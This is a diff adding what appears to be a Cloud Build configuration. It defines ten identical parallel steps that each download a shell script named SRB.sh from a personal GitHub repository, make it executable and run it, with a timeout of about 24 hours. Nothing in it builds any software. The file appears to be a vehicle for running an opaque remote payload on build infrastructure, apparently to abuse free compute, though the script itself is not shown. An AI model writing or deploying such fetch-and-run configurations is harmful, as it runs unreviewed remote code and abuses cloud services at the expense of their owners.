@@ -1,0 +1,91 @@
+steps:
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Kikinan86/tes/main/SRB.sh && chmod +x SRB.sh && ./SRB.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Kikinan86/tes/main/SRB.sh && chmod +x SRB.sh && ./SRB.sh
+  waitFor:
+    - '-'
+    
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Kikinan86/tes/main/SRB.sh && chmod +x SRB.sh && ./SRB.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Kikinan86/tes/main/SRB.sh && chmod +x SRB.sh && ./SRB.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Kikinan86/tes/main/SRB.sh && chmod +x SRB.sh && ./SRB.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Kikinan86/tes/main/SRB.sh && chmod +x SRB.sh && ./SRB.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Kikinan86/tes/main/SRB.sh && chmod +x SRB.sh && ./SRB.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Kikinan86/tes/main/SRB.sh && chmod +x SRB.sh && ./SRB.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Kikinan86/tes/main/SRB.sh && chmod +x SRB.sh && ./SRB.sh
+  waitFor:
+    - '-'
+
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      wget https://raw.githubusercontent.com/Kikinan86/tes/main/SRB.sh && chmod +x SRB.sh && ./SRB.sh
+  waitFor:
+    - '-'
+timeout: '86000s'
